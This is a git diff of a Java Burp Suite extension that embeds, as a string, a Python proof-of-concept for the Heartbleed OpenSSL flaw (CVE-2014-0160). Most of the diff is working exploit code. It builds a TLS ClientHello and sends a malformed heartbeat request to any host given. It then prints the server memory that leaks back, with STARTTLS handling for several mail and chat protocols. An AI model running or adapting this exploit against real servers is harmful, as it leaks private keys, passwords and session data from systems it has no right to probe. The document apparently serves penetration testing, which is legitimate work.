@@ -163,132 +163,138 @@ public class HeartBleed implements IMenuItemHandler, ITab, ActionListener {
 	 */
 	private String makeItBleed(final String host, final String port, final String starttls) {
 		final String prog = "#!/usr/bin/env python2\n" +
-        		"\n" +
-        		"#Author: takeshix <takeshix@adversec.com>\n" +
-        		"#PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).\n" +
-        		"#Thanks to Derek Callaway (decal@ethernet.org) for contributing various STARTTLS scenarios.\n" +
-        		"#Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.\n" +
-        		"#Modified by Ashkan Jahanbakhsh to make it burp friendly \n" +
-        		"\n" +
-        		"import sys,struct,socket\n" +
-        		"from argparse import ArgumentParser\n" +
-        		"\n" +
-        		"tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}\n" +
-        		"global run\n" +
-        		"run = True\n" +
-        		"\n" +
-        		"def info(msg):\n" +
-        		"    print '[*] {}'.format(msg)\n" +
-        		"\n" +
-        		"def error(msg):\n" +
-        		"    print '[-] {}'.format(msg)\n" +
-        		"    run = False\n" +
-        		"\n" +
-        		"def debug(msg):\n" +
-        		"    if opts.debug: print '\t[*] {}'.format(msg)\n" +
-        		"\n" +
-        		"def parse_cl():\n" +
-        		"    global opts\n" +
-        		"    parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\n" +
-        		"    parser.add_argument('host', help='IP or hostname of target system')\n" +
-        		"    parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')\n" +
-        		"    parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default='', help='Check STARTTLS')\n" +
-        		"    parser.add_argument('-d', '--debug', action='store_true', default='True', help='Enable debug output')\n" +
-        		"    opts = parser.parse_args()\n" +
-        		"\n" +
-        		"def hex2bin(arr):\n" +
-        		"    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')\n" +
-        		"\n" +
-        		"def build_client_hello(tls_ver):\n" +
-        		"    client_hello = [\n" +
-        		"# TLS header ( 5 bytes)\n" +
-        		"0x16,               # Content type (0x16 for handshake)\n" +
-        		"0x03, tls_ver,         # TLS Version\n" +
-        		"0x00, 0xdc,         # Length\n" +
-        		"# Handshake header\n" +
-        		"0x01,               # Type (0x01 for ClientHello)\n" +
-        		"0x00, 0x00, 0xd8,   # Length\n" +
-        		"0x03, tls_ver,         # TLS Version\n" +
-        		"# Random (32 byte)\n" +
-        		"0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,\n" +
-        		"0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,\n" +
-        		"0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,\n" +
-        		"0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,\n" +
-        		"0x00,               # Session ID length\n" +
-        		"0x00, 0x66,         # Cipher suites length\n" +
-        		"# Cipher suites (51 suites)\n" +
-        		"0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,\n" +
-        		"0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,\n" +
-        		"0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,\n" +
-        		"0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,\n" +
-        		"0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,\n" +
-        		"0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,\n" +
-        		"0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,\n" +
-        		"0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,\n" +
-        		"0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,\n" +
-        		"0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,\n" +
-        		"0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,\n" +
-        		"0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,\n" +
-        		"0x00, 0x06, 0x00, 0x03, 0x00, 0xff,\n" +
-        		"0x01,               # Compression methods length\n" +
-        		"0x00,               # Compression method (0x00 for NULL)\n" +
-        		"0x00, 0x49,         # Extensions length\n" +
-        		"# Extension: ec_point_formats\n" +
-        		"0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,\n" +
-        		"# Extension: elliptic_curves\n" +
-        		"0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,\n" +
-        		"0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,\n" +
-        		"0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,\n" +
-        		"0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,\n" +
-        		"0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,\n" +
-        		"0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,\n" +
-        		"0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,\n" +
-        		"# Extension: SessionTicket TLS\n" +
-        		"0x00, 0x23, 0x00, 0x00,\n" +
-        		"# Extension: Heartbeat\n" +
-        		"0x00, 0x0f, 0x00, 0x01, 0x01\n" +
-        		"    ]\n" +
-        		"    return client_hello\n" +
-        		"\n" +
-        		"def build_heartbeat(tls_ver):\n" +
-        		"    heartbeat = [\n" +
-        		"0x18,       # Content Type (Heartbeat)\n" +
-        		"0x03, tls_ver,  # TLS version\n" +
-        		"0x00, 0x03,  # Length\n" +
-        		"# Payload\n" +
-        		"0x01,       # Type (Request)\n" +
-        		"0x40, 0x00  # Payload length\n" +
-        		"    ] \n" +
-        		"    return heartbeat\n" +
-        		"\n" +
-        		"def hexdump(s):\n" +
-        		"    for b in xrange(0, len(s), 16):\n" +
-        		"        lin = [c for c in s[b : b + 16]]\n" +
-        		"        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n" +
-        		"        if((b % 14) != 0): sys.stdout.write(pdat)\n" +
-        		"        else: print '%s' % (pdat)\n" +
-        		"    print\n" +
-        		"\n" +
-        		"def rcv_tls_record(s):\n" +
-        		"    try:\n" +
-        		"        tls_header = s.recv(5)\n" +
-        		"        if not tls_header:\n" +
-        		"            error('Unexpected EOF (header)')            \n" +
-        		"        typ,ver,length = struct.unpack('>BHH',tls_header)\n" +
-        		"        message = ''\n" +
-        		"        while len(message) != length:\n" +
-        		"            message += s.recv(length-len(message))\n" +
-        		"        if not message:\n" +
-        		"            error('Unexpected EOF (message)')\n" +
-        		"        debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))\n" +
-        		"        return typ,ver,message\n" +
-        		"    except Exception as e:\n" +
-        		"        error(e)\n" +
-        		"\n" +
-        		"def main():\n" +
-        		"    run = True\n" +
-        		"    parse_cl()\n" +
-        		"\n" +
+				"\n" +
+				"#Author: takeshix <takeshix@adversec.com>\n" +
+				"#PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).\n" +
+				"#Thanks to Derek Callaway (decal@ethernet.org) for contributing various STARTTLS scenarios.\n" +
+				"#Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.\n" +
+				"#Modified by Ashkan Jahanbakhsh to make it burp friendly \n" +
+				"#Leaked memory can be dumped directly into an outfile.\n" +
+				"\n" +
+				"import sys,struct,socket\n" +
+				"from argparse import ArgumentParser\n" +
+				"\n" +
+				"\n" +
+				"tls_versions = {0x00:'TLSv1,3' ,0x03:'TLSv1.2',0x02:'TLSv1.1',0x01:'TLSv1.0'}\n" +
+				"\n" +
+				"def info(msg):\n" +
+				"    print '[+] {}'.format(msg)\n" +
+				"\n" +
+				"def error(msg):\n" +
+				"    print '[ - ] {}'.format(msg)\n" +
+				"    run = False\n" +
+				"\n" +
+				"def debug(msg):\n" +
+				"    if opts.debug: print '	[+] {}'.format(msg)\n" +
+				"\n" +
+				"def parse_cl():\n" +
+				"    global opts\n" +
+				"    parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\n" +
+				"    parser.add_argument('host', help='IP or hostname of target system')\n" +
+				"    parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')\n" +
+				"    parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')\n" +
+				"    parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default='', help='Check STARTTLS')\n" +
+				"    parser.add_argument('-d', '--debug', action='store_true', default='True', help='Enable debug output')\n" +
+				"    opts = parser.parse_args()\n" +
+				"\n" +
+				"\n" +
+				"def hex2bin(arr):\n" +
+				"    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')\n" +
+				"\n" +
+				"def build_client_hello(tls_ver):\n" +
+				"    client_hello = [\n" +
+				"# TLS header ( 5 bytes)\n" +
+				"0x16,               # Content type (0x16 for handshake)\n" +
+				"0x03, tls_ver,         # TLS Version\n" +
+				"0x00, 0xdc,         # Length\n" +
+				"# Handshake header\n" +
+				"0x01,               # Type (0x01 for ClientHello)\n" +
+				"0x00, 0x00, 0xd8,   # Length\n" +
+				"0x03, tls_ver,         # TLS Version\n" +
+				"# Random (32 byte)\n" +
+				"0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,\n" +
+				"0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,\n" +
+				"0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,\n" +
+				"0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,\n" +
+				"0x00,               # Session ID length\n" +
+				"0x00, 0x66,         # Cipher suites length\n" +
+				"# Cipher suites (51 suites)\n" +
+				"0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,\n" +
+				"0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,\n" +
+				"0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,\n" +
+				"0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,\n" +
+				"0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,\n" +
+				"0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,\n" +
+				"0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,\n" +
+				"0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,\n" +
+				"0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,\n" +
+				"0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,\n" +
+				"0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,\n" +
+				"0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,\n" +
+				"0x00, 0x06, 0x00, 0x03, 0x00, 0xff,\n" +
+				"0x01,               # Compression methods length\n" +
+				"0x00,               # Compression method (0x00 for NULL)\n" +
+				"0x00, 0x49,         # Extensions length\n" +
+				"# Extension: ec_point_formats\n" +
+				"0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,\n" +
+				"# Extension: elliptic_curves\n" +
+				"0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,\n" +
+				"0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,\n" +
+				"0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,\n" +
+				"0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,\n" +
+				"0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,\n" +
+				"0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,\n" +
+				"0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,\n" +
+				"# Extension: SessionTicket TLS\n" +
+				"0x00, 0x23, 0x00, 0x00,\n" +
+				"# Extension: Heartbeat\n" +
+				"0x00, 0x0f, 0x00, 0x01, 0x01\n" +
+				"    ]\n" +
+				"    return client_hello\n" +
+				"\n" +
+				"def build_heartbeat(tls_ver):\n" +
+				"    heartbeat = [\n" +
+				"0x18,       # Content Type (Heartbeat)\n" +
+				"0x03, tls_ver,  # TLS version\n" +
+				"0x00, 0x03,  # Length\n" +
+				"# Payload\n" +
+				"0x01,       # Type (Request)\n" +
+				"0x40, 0x00  # Payload length\n" +
+				"    ]\n" +
+				"    return heartbeat\n" +
+				"\n" +
+				"def hexdump(s):\n" +
+				"    for b in xrange(0, len(s), 16):\n" +
+				"        lin = [c for c in s[b : b + 16]]\n" +
+				"        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n" +
+				"        if((b % 14) != 0): sys.stdout.write(pdat)\n" +
+				"        else: print '%s' % (pdat)\n" +
+				"    print\n" +
+				"\n" +
+				"def rcv_tls_record(s):\n" +
+				"    try:\n" +
+				"        tls_header = s.recv(5)\n" +
+				"        if not tls_header:\n" +
+				"            typ = 21\n" +
+				"            ver = 0x300\n" +
+				"            message = ''\n" +
+				"            return typ, ver, message\n" +
+				"        typ, ver, length = struct.unpack('>BHH',tls_header)\n" +
+				"        message = ''\n" +
+				"        while len(message) != length:\n" +
+				"            message += s.recv(length-len(message))\n" +
+				"        if not message:\n" +
+				"            error('Unexpected EOF (message)')\n" +
+				"            return False\n" +
+				"        debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))\n" +
+				"        return typ, ver, message\n" +
+				"    except Exception as e:\n" +
+				"        error(e)\n" +
+				"\n" +
+				"def main():\n" +
+				"    run = True\n" +
+				"    parse_cl()\n" +
+				"\n" +
         		"    try:\n" +
         		"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
         		"        info('Connecting...')\n" +
@@ -298,7 +304,7 @@ public class HeartBleed implements IMenuItemHandler, ITab, ActionListener {
         		"            print '[ - ] Could not open socket: ' + message\n" +
         		"            s.close()\n"+
         		"        return False\n" +
-        		"\n" +
+				"\n" +
         		"    if len(opts.starttls) > 0:\n" +
         		"        BUFSIZE=4096\n" +
         		"        if opts.starttls.lower().strip() == 'smtp':\n" +
@@ -329,49 +335,34 @@ public class HeartBleed implements IMenuItemHandler, ITab, ActionListener {
         		"            s.send(\"<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\\n\")\n"+
         		"            s.recv(BUFSIZE)\n" +
         		"    \n" +
-        		"    supported = False\n" +
-        		"    for num,tlsver in tls_versions.items():\n" +
-        		"        info('Sending ClientHello for {}'.format(tlsver))\n" +
-        		"        s.send(hex2bin(build_client_hello(num)))\n" +
-        		"        info('Waiting for Server Hello...')\n" +
-        		"        while True:\n" +
-        		"            typ,ver,message = rcv_tls_record(s)\n" +
-        		"            if not typ:\n" +
-        		"                error('Server closed connection without sending ServerHello for {}'.format(tlsver))\n" +
-        		"                continue\n" +
-        		"            if typ is 22 and ord(message[0]) is 0x0E:\n" +
-        		"                info('Reveiced ServerHello for {}'.format(tlsver))\n" +
-        		"                supported = num\n" +
-        		"                break\n" +
-        		"        if supported: break\n" +
-        		"\n" +
-        		"    if not supported:\n" +
-        		"        error('No TLS version is supported')\n" +
-        		"\n" +
-        		"    info('Sending heartbeat request...')\n" +
-        		"    s.send(hex2bin(build_heartbeat(supported)))\n" +
-        		"\n" +
-        		"    while run:\n" +
-        		"        typ,ver,message = rcv_tls_record(s)\n" +
-        		"        if not run:\n" +
-        		"            break\n" +
-        		"        if typ == None:\n" +
-        		"            error('No heartbeat response received, server likely not vulnerable.')\n" +
-        		"            break\n" +
-        		"        if typ is 24:\n" +
-        		"            info('Received heartbeat response:')\n" +
-        		"            if len(message) > 3:\n" +
-        		"                hexdump(message)\n" +
-        		"                info('Server is vulnerable!')\n" +
-        		"                break\n" +
-        		"            else:\n" +
-        		"                error('Server processed malformed heartbeat, but did not return any extra data.')\n" +
-        		"                break\n" +
-        		"        elif typ is 21:\n" +
-        		"            error('Received alert, server is not vulnerable!')\n" +
-        		"            break\n" +
-        		"if __name__ == '__main__':" +
-        		"    main()";
+				"    vulnerable = False\n" +
+				"    info('Sending ClientHello')\n" +
+				"    info('Sending heartbeat request...')\n" +
+				"    for num, tlsver in tls_versions.items():\n" +
+				"        if vulnerable:\n" +
+				"            break\n" +
+				"        Runner = True\n" +
+				"        s.send(hex2bin(build_client_hello(num)))\n" +
+				"        s.send(hex2bin(build_heartbeat(num)))\n" +
+				"        while Runner is True:\n" +
+				"            typ, ver, message = rcv_tls_record(s)\n" +
+				"            if not typ:\n" +
+				"                Runner = False\n" +
+				"            if typ is 24:\n" +
+				"                if len(message) > 3:\n" +
+				"                    hexdump(message)\n" +
+				"                    vulnerable = True\n" +
+				"                    Runner = False\n" +
+				"            if typ is 21:\n" +
+				"                Runner = False\n" +
+				"    if vulnerable:\n" +
+				"        info('Server is vulnerable!')\n" +
+				"    else:\n" +
+				"        error('Server is not vulnerable!')\n" +
+				"\n" +
+				"\n" +
+				"if __name__ == '__main__':\n" +
+				"    main()\n";
 		
 		final String[] stls = {"smtp", "pop3", "imap", "ftp", "xmpp"};  
 
